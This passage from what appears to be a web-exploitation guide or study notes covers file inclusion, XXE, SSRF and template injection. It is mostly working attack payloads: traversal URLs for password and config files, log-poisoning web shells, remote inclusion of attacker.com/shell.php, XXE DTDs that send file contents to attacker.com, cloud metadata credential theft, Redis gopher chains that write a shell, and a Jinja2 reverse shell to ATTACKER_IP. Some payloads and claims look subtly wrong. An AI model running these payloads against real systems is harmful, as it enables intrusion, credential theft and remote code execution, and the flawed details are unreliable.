- Search for parameters with names suggesting file operations: page, file, include, view, content, section, lang, document
- Test each parameter for directory traversal and inclusion patterns
```

**Basic Directory Traversal**

Attempt to access files outside intended directories:

```
http://target/page.php?file=../../../etc/passwd
http://target/page.php?file=../../windows/win.ini
http://target/page.php?file=/etc/passwd
http://target/page.php?file=../../../../etc/shadow
```

Traverse using encoded sequences:

```
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd (double URL encoding)
....//....//....//etc/passwd
..\..\..\..\windows\win.ini (Windows backslash)
```

**Null Byte Truncation (Legacy)**

Exploit null byte handling in older PHP versions:

```
http://target/page.php?file=../../../etc/passwd%00
http://target/page.php?file=../../../etc/passwd%00.jpg
```

[Unverified] Null byte truncation was a common LFI exploitation vector in PHP < 5.3 where the null byte (`%00`) truncated string processing, causing `.jpg` suffix validation to be ignored when null bytes were processed as string terminators, though this vulnerability is patched in modern PHP versions and contemporary systems.

**Absolute Path Inclusion**

Use absolute paths bypassing relative path filtering:

```
http://target/page.php?file=/etc/passwd
http://target/page.php?file=/var/www/html/config.php
http://target/page.php?file=/proc/self/environ
```

Analyze application behavior with absolute paths to identify [Inference] whether input validation restricts only relative paths or implements comprehensive path filtering, though robust implementations validate all paths regardless of absolute/relative nature.

**Log File Inclusion**

Access application and system logs for credential disclosure or code execution:

```
http://target/page.php?file=../../../var/log/apache2/access.log
http://target/page.php?file=../../../var/log/nginx/access.log
http://target/page.php?file=../../../var/log/auth.log
http://target/page.php?file=../../../windows/system32/drivers/etc/hosts
```

Logs may contain [Inference] user-supplied data (User-Agent, referrer) embedded in log entries, enabling log file poisoning combined with inclusion for code execution when logs are included.

**Log File Poisoning for Code Execution**

Inject code into accessible logs:

```bash
# HTTP User-Agent injection
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target/

# Apache access log inclusion
http://target/page.php?file=../../../var/log/apache2/access.log
```

Request the poisoned log through LFI:

```
http://target/page.php?file=../../../var/log/apache2/access.log&cmd=id
```

[Inference] Log file inclusion with code injection enables arbitrary code execution under web server user privileges when included files are processed as PHP or other executable types, though exploitation requires the inclusion point to process file contents as code rather than displaying raw content.

**Proc Filesystem Enumeration (Linux)**

Access process information through `/proc`:

```
http://target/page.php?file=/proc/self/environ
http://target/page.php?file=/proc/self/cmdline
http://target/page.php?file=/proc/[pid]/maps
http://target/page.php?file=/proc/net/tcp
http://target/page.php?file=/proc/version
```

`/proc/self/environ` reveals [Inference] environment variables (PATH, HOME, USER, database credentials) passed to the web application process, while `/proc/net/tcp` enumerates established network connections potentially revealing backend database/cache connections.

**Configuration File Disclosure**

Target application and system configuration files:

```
http://target/page.php?file=../../../etc/apache2/apache2.conf
http://target/page.php?file=../../../etc/mysql/my.cnf
http://target/page.php?file=../../../etc/postgresql/postgresql.conf
http://target/page.php?file=../../../windows/system32/config/sam
http://target/page.php?file=../../../windows/win.ini
```

Application-specific configurations:

```
http://target/page.php?file=config.php
http://target/page.php?file=../config.php
http://target/page.php?file=../database.yml
http://target/page.php?file=../../settings.json
```

Configuration files frequently contain [Inference] database credentials, API keys, service account credentials, or encryption keys enabling further system compromise beyond initial information disclosure.

**PHP Wrapper Exploitation**

Use PHP stream wrappers for code execution and file manipulation:

```
http://target/page.php?file=php://filter/convert.base64-encode/resource=index.php
http://target/page.php?file=php://filter/convert.base64-encode/resource=config.php
```

The `convert.base64-encode` filter encodes file contents enabling retrieval of PHP files without direct execution. Base64-decode retrieved content:

```bash
echo "PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsgPz4=" | base64 -d
```

PHP data wrapper for code execution:

```
http://target/page.php?file=data:text/plain,<?php system($_GET['cmd']); ?>
http://target/page.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

[Unverified] Data wrapper exploitation requires `allow_url_include` directive enabled in PHP configuration (default disabled in modern PHP), and execution depends on whether included content is processed as code or displayed as text.

**Remote Inclusion with Wrappers**

Combine local inclusion with remote content:

```
http://target/page.php?file=expect://whoami
http://target/page.php?file=input://POST
http://target/page.php?file=/dev/stdin (when combined with POST data)
```

[Inference] Expect wrapper enables arbitrary command execution on systems with `expect://` protocol support, though this requires PHP compiled with expect support (uncommon in modern deployments).

**LFI to RCE via Session Files**

Access PHP session files containing user-controlled data:

```bash
# Identify session file location
http://target/page.php?file=/var/lib/php/sessions/sess_[SESSIONID]
http://target/page.php?file=/tmp/sess_[SESSIONID]
```

Session files contain [Inference] serialized PHP objects and user data, enabling code injection when sessions store user-supplied input (username, profile data) without sanitization and the inclusion point deserializes session data.

Create malicious session data:

```php
<?php
$_SESSION['username'] = '<?php system($_GET["cmd"]); ?>';
?>
```

Request through LFI:

```
http://target/page.php?file=/tmp/sess_SESSIONID
```

[Unverified] Session-based RCE exploitation depends on session data storage format (PHP serialization, JSON), deserialization behavior, and whether included content is processed as code.

**Compression Wrapper Exploitation**

Access compressed files through wrapper filters:

```
http://target/page.php?file=compress.zlib://archive.zip
http://target/page.php?file=compress.bzip2://file.bz2
```

[Unverified] Compression wrappers enable extraction and reading of compressed archives through inclusion mechanisms, though exploitation requires the specific compression wrapper to be enabled in PHP configuration.

**LFI Filter Chain Construction**

Chain multiple filters for bypass and execution:

```
http://target/page.php?file=php://filter/convert.base64-encode/convert.base64-encode/resource=index.php
```

Analyze LFI filter usage patterns:

```bash
# Test filter application
http://target/page.php?file=php://filter/string.rot13/resource=index.php
```

[Inference] Filter chaining enables complex transformations of file contents potentially bypassing simple pattern matching or creating exploitable encoding states, though chaining complexity depends on available filters and processing order.

---

## Remote File Inclusion (RFI)

Remote File Inclusion vulnerabilities enable arbitrary code execution through inclusion of external files, allowing attackers to host malicious code on attacker-controlled servers and execute it within the target application context.

**RFI Vulnerability Identification**

Identify inclusion points accepting external URLs:

```bash
http://target/page.php?file=http://attacker.com/shell.php
http://target/page.php?page=https://attacker.com/content.php
http://target/view.php?document=ftp://attacker.com/payload.txt
```

Burp Suite testing:

```
Analyze application parameters for file/page/content/include/load patterns
Test with external URL payloads
Monitor for successful inclusion (200 response, external content reflected)
```

**External File Hosting**

Set up attacker-controlled server hosting payload files:

```bash
# Python simple HTTP server
python3 -m http.server 8080

# PHP built-in server
php -S 0.0.0.0:8080

# Netcat for single file delivery
{ echo -ne "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n"; cat shell.php; } | nc -l -p 8080
```

Alternatively, use public hosting:

```
pastebin.com (with raw URL)
raw.githubusercontent.com (GitHub raw content)
attacker-controlled VPS or cloud instance
```

**Basic RFI Exploitation**

Include external PHP code:

```bash
# Attacker server hosts shell.php with payload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8080

# Target URL includes attacker's payload
http://target/page.php?file=http://attacker.com:8080/shell.php?cmd=id
```

Execute arbitrary commands through the included file:

```
http://target/page.php?file=http://attacker.com/shell.php&cmd=whoami
http://target/page.php?file=http://attacker.com/shell.php&cmd=cat%20/etc/passwd
```

**Protocol Specification for RFI**

Include files using various protocols:

```
http://attacker.com/shell.php
https://attacker.com/shell.php
ftp://attacker.com/shell.php
ftps://attacker.com/shell.php
```

[Inference] Protocol support depends on PHP stream wrapper configurationâ€”HTTP(S) typically enabled by default, while FTP/FTPS require explicit configuration, though modern PHP defaults restrict remote inclusion via `allow_url_include` directive.

**Filter-Based RFI**

Use PHP filters combined with remote inclusion:

```
http://target/page.php?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.php
```

[Unverified] Filter chains applied to remote files enable [Inference] encoding/transformation of external content potentially bypassing filter-based detection, though most filters process content client-side rather than preventing execution.

**RFI via Local Wrappers**

Combine RFI with local wrapper exploitation:

```
http://target/page.php?file=data:text/plain,<?php system($_GET['cmd']); ?>
http://target/page.php?file=data:text/html,<php echo shell_exec($_GET['cmd']); ?>
```

[Unverified] Data URI schemes enable inline code inclusion without external hosting, though exploitation requires `allow_url_fopen` and `allow_url_include` PHP directives both enabled.

**Polyglot RFI/LFI Payloads**

Craft payloads usable for both RFI and LFI:

```php
<?php
// Payload works as both included file and executed code
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
// Execute if loaded as LFI
if(basename(__FILE__) == 'shell.php') {
    system($_GET['cmd']);
}
?>
```

[Inference] Polyglot payloads enable exploitation of mixed RFI/LFI vulnerabilities where the same payload functions in both inclusion contexts.

**RFI Exploitation via POST Data**

Include remote content processed with POST data:

```bash
# Target application: page.php includes file from $_POST['file']
curl -X POST http://target/page.php \
  -d "file=http://attacker.com/shell.php"
```

Include wrapper with POST data:

```
http://target/page.php?file=input://POST
POST data: <?php system($_GET['cmd']); ?>
```

[Unverified] Input wrapper exploitation requires specific PHP configuration and POST-to-stdin mapping.

**Null Byte Bypasses in RFI**

Exploit null byte handling in older PHP versions:

```
http://target/page.php?file=http://attacker.com/shell.php%00.jpg
```

[Unverified] Null byte truncation in legacy PHP versions truncated strings at null bytes, enabling bypass of file extension validation when `.jpg` suffix requirements were removed by null byte injection, though this vector is patched in PHP â‰¥ 5.3.

**RFI Detection and Evasion**

Identify and bypass RFI detection mechanisms:

```
# Standard detection patterns
if(strpos($file, 'http') !== false) { die('RFI blocked'); }

# Evasion techniques
http://{attacker.com}/shell.php  (braces)
//attacker.com/shell.php  (protocol-relative)
ht\tp://attacker.com/shell.php  (backslash encoding, Windows)
HTTP://attacker.com/shell.php  (case manipulation)
```

Alternative obfuscation:

```php
$base64_url = base64_encode("http://attacker.com/shell.php");
// Decoded at runtime
include(base64_decode($base64_url));
```

[Inference] Detection bypass techniques exploit overly simplistic string matching where the underlying vulnerability remains exploitable through alternative representation of the same payload.

**RFI via Parameter Pollution**

Exploit parameter handling vulnerabilities:

```
http://target/page.php?file=safe.php?file=http://attacker.com/shell.php
http://target/page.php?file=safe.php&file=http://attacker.com/shell.php
```

[Unverified] Parameter pollution may cause [Inference] different code paths to use different parameter valuesâ€”frontend validation checking `file=safe.php` while backend processing uses `file=http://attacker.com/shell.php`â€”though specific behavior depends on application framework parameter handling.

---

## XXE (XML External Entity)

XXE vulnerabilities enable arbitrary file disclosure, SSRF (Server-Side Request Forgery), and denial-of-service through exploitation of XML entity expansion and external entity processing in XML parsers.

**XXE Vulnerability Identification**

Identify XML processing entry points:

```bash
# Content-Type header indicates XML processing
POST /api/upload HTTP/1.1
Content-Type: application/xml

# Forms accepting XML data
POST /process HTTP/1.1
Content-Type: application/x-www-form-urlencoded
data=<xml>...</xml>

# File uploads with XML extension
POST /upload HTTP/1.1
[file.xml content]

# SOAP services
POST /service.asmx HTTP/1.1
Content-Type: text/xml
```

Burp Suite XML detection:

```
- Crawl application identifying XML endpoints
- Analyze request/response Content-Type headers
- Test parameters with XML payloads
- Monitor for XML parsing errors or XXE indicators
```

**Basic XXE File Disclosure**

Define external entities referencing local files:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Alternative syntax:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

Post as XML data:

```bash
curl -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <foo>&xxe;</foo>' \
  http://target/process.php
```

Successful XXE responses include file contents in XML output [Inference] appearing within expected XML elements, though response format depends on how the application structures and displays parsed XML.

**Windows File Access via XXE**

Access Windows-specific file paths:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>
```

Configuration files:

```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/config/sam">
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/config/system">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
```

**Out-of-Band (OOB) XXE for Data Exfiltration**

Exfiltrate data through external network requests when direct XXE responses don't display entity values:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
  %dtd;
]>
<foo></foo>
```

Attacker-hosted `exfil.dtd`:

```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?exfil=%file;'>
%send;">
%all;
```

[Inference] Out-of-band XXE enables exfiltration when blind XXE conditions prevent direct response inclusionâ€”data is transmitted to attacker-controlled server through DNS queries or HTTP requests triggered by entity expansion, though data must be URL-encoded for transmission in request URI.

**Blind XXE Detection and Exploitation**

Detect blind XXE through timing or error-based channels:

```xml
<!-- Time-based blind XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/zero">
]>
<foo>&xxe;</foo>
```

[Unverified] Time-based XXE exploitation through references to `/dev/zero` causes [Inference] parser delays when processing infinite input, though exploitation timing is unreliable and [Unverified] effectiveness depends on XML parser implementation and resource handling.

Error-based XXE:

```xml
<!-- Trigger XML parsing error revealing file contents -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

[Inference] Error-based XXE exploits XML parsing errors that display entity expansion results in error messages, though this requires error messages to be returned to the client rather than logged server-side only.

**XXE SSRF Exploitation**

Use XXE to make requests to internal systems:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<foo>&xxe;</foo>
```

Scan internal network through XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<foo>&xxe;</foo>
```

Access internal services:

```xml
<!-- Redis -->
<!ENTITY xxe SYSTEM "gopher://localhost:6379/FLUSHDB">

<!-- MySQL -->
<!ENTITY xxe SYSTEM "gopher://localhost:3306/">

<!-- SMTP -->
<!ENTITY xxe SYSTEM "gopher://localhost:25/HELO%20attacker">
```

[Inference] XXE-based SSRF enables internal network reconnaissance and service enumeration when XML entity expansion processes network protocol URIs, though specific protocol support depends on XML parser implementation and URL stream wrapper availability.

**XXE Denial of Service (Billion Laughs Attack)**

Create exponentially expanding entity definitions causing parser resource exhaustion:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

[Inference] Billion Laughs attack exploits exponential entity expansion causing [Inference] memory consumption and CPU resource exhaustion, enabling denial-of-service through parser resource limits, though modern XML parsers implement entity expansion limits preventing this attack.

**XXE with DTD External References**

Combine DTD processing with external entities for enhanced exploitation:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
<foo>&xxe;</foo>
```

Attacker-hosted `malicious.dtd`:

```xml
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

[Inference] External DTD loading enables [Inference] centralized payload hosting and distribution of complex XXE payloads, though exploitation depends on the target accepting external DTD references.

**XXE Filter Evasion**

Bypass simple XXE detection through encoding and obfuscation:

```xml
<!-- URL encoding in file:// URI -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd%00.jpg">
]>
<foo>&xxe;</foo>

<!-- Base64 encoded entity definition -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBmb28gWwogIDwhRU5USVRZIHR5cGU9InB1YmxpYyIgc3lzdGVtID0iZmlsZTovL2V0Yy9wYXNzd2QiPgpdPgo8Zm9vPiZwYXNzd2Q7PC9mb28+</foo>
```

[Inference] Encoding-based XXE evasion exploits overly simplistic detection patterns that match literal entity keywords, though robust implementations detect XXE regardless of encoding through parser-level safeguards.

**XXE via SOAP Services**

SOAP services processing XML enable XXE exploitation:

```xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <ns:request xmlns:ns="http://target.local/service">
      <data>&xxe;</data>
    </ns:request>
  </soap:Body>
</soap:Envelope>
```

Post to SOAP endpoint:

```bash
curl -X POST -H "Content-Type: text/xml" \
  -d @soap_xxe.xml \
  http://target/service.asmx
```

[Inference] SOAP services often process XML without XXE protections when developers assume SOAP framework handles validation, though SOAP parsers typically use underlying XML libraries vulnerable to XXE exploitation.

**XXE via SVG Image Upload**

SVG files are XML-based and may be processed for inclusion or validation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ELEMENT svg ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Upload SVG and trigger processing:

```bash
curl -F "file=@xxe.svg" http://target/upload.php
```

[Inference] Image processing libraries using XML parsing for SVG validation enable XXE exploitation when SVG content is processed server-side, though exploitation depends on library implementation and XXE protection configuration.

**XXE via PDF Metadata**

PDF files containing XML metadata may be vulnerable:

```bash
# Create PDF with XXE payload in metadata
exiftool -XMP-dc:Creator='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' document.pdf
```

[Unverified] XXE exploitation through PDF metadata requires PDF processing libraries to parse and process XML metadata, though most PDF libraries extract text without XML processing [Inference] making this vector uncommon.

**XXE in XLSX/DOCX Exploitation**

Microsoft Office formats use ZIP archives containing XML, enabling XXE through document processing:

```bash
# Create malicious XLSX
mkdir -p tmp_xlsx/xl/worksheets
cat > tmp_xlsx/xl/worksheets/sheet1.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1" t="inlineStr">
        <is><t>&xxe;</t></is>
      </c>
    </row>
  </sheetData>
</worksheet>
EOF

cd tmp_xlsx && zip -r ../malicious.xlsx * && cd ..
```

Upload XLSX to target for processing:

```bash
curl -F "file=@malicious.xlsx" http://target/process.php
```

[Inference] Office document processing enables XXE exploitation when documents are parsed by vulnerable XML libraries, though modern Office processing libraries implement XXE protections by default.

**XXE Detection and Prevention Testing**

Identify XXE protection through error analysis:

```xml
<!-- Submit XXE payload observing response -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Response indicators:

- XML parsing error (disabled XXE) â€” "Entity references are not allowed"
- No output (XXE disabled) â€” Entity not expanded
- File contents displayed (XXE vulnerable) â€” Successful exploitation
- External entity reference blocked â€” "DOCTYPE not allowed"

[Unverified] XXE protection mechanisms include disabling DOCTYPE processing, entity expansion limits, or XXE-specific configurations, though specific protection level depends on XML parser library and application framework configuration.

**XXE Parameter Entity Exploitation**

Exploit parameter entity processing for enhanced payloads:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/payload.dtd">
  %dtd;
]>
<foo></foo>
```

Attacker-hosted `payload.dtd`:

```xml
<!ENTITY % all "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>%exfil;">
%all;
```

[Inference] Parameter entity exploitation enables complex multi-stage XXE attacks with external DTD coordination, though the attack requires both parameter entity processing enabled and external DTD loading permitted.

**XXE via XPath Injection**

Combine XXE with XPath injection for complex exploitation:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>
  <username>&xxe;</username>
  <password>' or '1'='1</password>
</foo>
```

[Unverified] XPath injection combined with XXE enables [Inference] simultaneous exploitation of multiple vulnerability types when applications process both XML entities and XPath queries, though the attack surface depends on specific application implementation.

**XXE Exploitation in REST APIs**

REST endpoints accepting XML content enable XXE exploitation:

```bash
curl -X POST http://target/api/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <data>&xxe;</data>'
```

JSON APIs with XML fallback:

```bash
# Test if API accepts XML when JSON fails
curl -X POST http://target/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <request><id>&xxe;</id></request>'
```

[Inference] REST API XXE exploitation occurs when APIs process XML alongside JSON, sometimes accepting XML through content-type negotiation or fallback handling when JSON parsing fails.

**XXE with CDATA Bypass**

Attempt XXE with CDATA sections potentially bypassing filters:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>
```

[Unverified] CDATA sections disable entity expansion within content, preventing XXE exploitation in this context, though CDATA bypass attempts are commonly tested despite low exploitation probability.

**XXE Exploitation Automation**

Automated XXE testing using specialized tools:

```bash
# XXEinjector
xxeinjector --host attacker.com --file /path/to/xxe_payloads.txt

# Burp Suite XXE plugin
# Configure XXE detection and exploitation settings within Burp

# Manual Python exploitation
python3 << 'EOF'
import requests
payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''
r = requests.post('http://target/process.php', data=payload, headers={'Content-Type': 'application/xml'})
print(r.text)
EOF
```

**XXE via Content-Type Header Exploitation**

Exploit content-type negotiation enabling XXE:

```bash
# Some frameworks process XML when Accept header requests XML
curl -X POST http://target/api/endpoint \
  -H "Accept: application/xml" \
  -H "Content-Type: application/json" \
  -d '<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <request><data>&xxe;</data></request>'
```

[Inference] Content-type negotiation vulnerabilities enable XXE exploitation when frameworks incorrectly parse request/response types based on Accept headers or Content-Type overrides, though proper framework implementation validates content independent of declared MIME types.

**XXE Information Gathering for Privilege Escalation**

Combine XXE file disclosure with reconnaissance data:

```xml
<!-- Extract database configuration -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY db SYSTEM "file:///etc/mysql/my.cnf">
  <!ENTITY config SYSTEM "file:///var/www/html/config.php">
]>
<foo>
  <database>&db;</database>
  <config>&config;</config>
</foo>
```

Extracted credentials enable [Inference] database access and lateral movement to backend systems, though credential location and format depend on specific application configuration.

---

## SSRF (Server-Side Request Forgery)

### Concept Overview

SSRF vulnerabilities allow attackers to make the server perform requests to arbitrary locations, including internal resources not directly accessible from the attacker's position.

### Common SSRF Vectors

**URL Parameters**

```bash
# Basic SSRF test
http://target.com/fetch?url=http://internal-service:8080

# Cloud metadata endpoints (AWS)
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/

# Local file access
http://target.com/fetch?url=file:///etc/passwd
```

**HTTP Header Injection**

```http
GET /download HTTP/1.1
Host: target.com
X-Forwarded-For: http://internal-service
Referer: http://admin-panel.internal
```

### Bypass Techniques

**IP Address Obfuscation**

```bash
# Decimal format
http://2130706433/  # 127.0.0.1

# Octal format
http://0177.0.0.1/

# Hexadecimal format
http://0x7f.0x0.0x0.0x1/

# Mixed formats
http://0x7f.0.0.1/

# IPv6 localhost
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
```

**DNS Rebinding**

```bash
# Use services like 1u.ms or nip.io
http://127.0.0.1.nip.io/
http://localtest.me/  # Resolves to 127.0.0.1
```

**URL Encoding and Double Encoding**

```bash
# Single encoding
http://target.com/fetch?url=http%3A%2F%2F127.0.0.1%2Fadmin

# Double encoding
http://target.com/fetch?url=http%253A%252F%252F127.0.0.1%252Fadmin
```

**Protocol Smuggling**

```bash
# Different protocols
gopher://127.0.0.1:6379/_SET%20key%20value
dict://127.0.0.1:11211/stats
ldap://127.0.0.1:389/dc=example,dc=com
```

### Cloud Metadata Exploitation

**AWS Metadata**

```bash
# IMDSv1 (legacy)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

**Azure Metadata**

```bash
# Azure Instance Metadata Service
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Access tokens
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Google Cloud Metadata**

```bash
# GCP metadata
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"

# Service account tokens
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

### Internal Network Scanning via SSRF

**Port Scanning**

```python
# Python script for SSRF port scanning
import requests

target = "http://vulnerable.com/fetch?url="
internal_host = "192.168.1.10"

for port in range(1, 1000):
    url = f"{target}http://{internal_host}:{port}"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code != 500:  # Adjust based on error behavior
            print(f"[+] Port {port} appears open")
    except:
        pass
```

**Gopher Protocol for Protocol Smuggling**

```bash
# Generate gopher payload for Redis
# Set a key-value pair
gopher://127.0.0.1:6379/_SET%20shell%20"<?php system($_GET['cmd']); ?>"

# Save to file
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php
gopher://127.0.0.1:6379/_SAVE
```

### SSRF to RCE Chains

**Exploiting Internal Services**

```bash
# Redis exploitation
ssrftest.py --target http://vulnerable.com/fetch --internal redis://127.0.0.1:6379

# Memcached exploitation
http://vulnerable.com/fetch?url=gopher://127.0.0.1:11211/_stats

# ElasticSearch exploitation
http://vulnerable.com/fetch?url=http://127.0.0.1:9200/_search?source={"query":{"match_all":{}}}
```

### Tools for SSRF Detection and Exploitation

**SSRFmap**

```bash
# Basic usage
python3 ssrfmap.py -r request.txt -p url

# With modules
python3 ssrfmap.py -r request.txt -p url -m readfiles

# AWS module
python3 ssrfmap.py -r request.txt -p url -m aws
```

**Gopherus** (Generate gopher payloads)

```bash
# MySQL payload
gopherus --exploit mysql

# Redis payload
gopherus --exploit redis

# FastCGI payload
gopherus --exploit fastcgi
```

---

## Template Injection

### Server-Side Template Injection (SSTI)

**Detection Methodology**

```bash
# Polyglot payload for detection
{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{ 7*7}

# Basic math expressions
{{7*'7'}}  # Jinja2: 7777777
${7*7}     # FreeMarker/Velocity: 49
<%= 7*7 %> # ERB: 49
```

### Jinja2 Template Injection (Python/Flask)

**Basic Detection**

```python
# Test payload
{{7*7}}  # Should return 49
{{config}}  # Attempt to access config object
```

**RCE Exploitation**

```python
# Access to os module
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Alternative using subprocess
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}

# Using request object
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1').read()}}
```

**Object Traversal**

```python
# Find useful classes
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen index
{% for i in range(500) %}
    {{i}}: {{''.__class__.__mro__[1].__subclasses__()[i].__name__}}
{% endfor %}
```

### Twig Template Injection (PHP)

**Detection**

```twig
{{7*7}}
{{_self}}
{{dump(app)}}
```

**RCE Exploitation**

```twig
# Execute system commands
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Using system function
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}

# File read
{{'/etc/passwd'|file_excerpt(1,30)}}
```

### FreeMarker Template Injection (Java)

**Detection**

```freemarker
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>
```

**RCE Exploitation**

```freemarker
# Execute system commands
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# Alternative method
<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

### Velocity Template Injection (Java)

**Detection**

```velocity
${7*7}
#set($x=7*7)$x
```

**RCE Exploitation**

```velocity
# Class loading and execution
#set($rt = $class.forName("java.lang.Runtime"))
#set($chr = $class.forName("java.lang.Character"))
#set($str = $class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
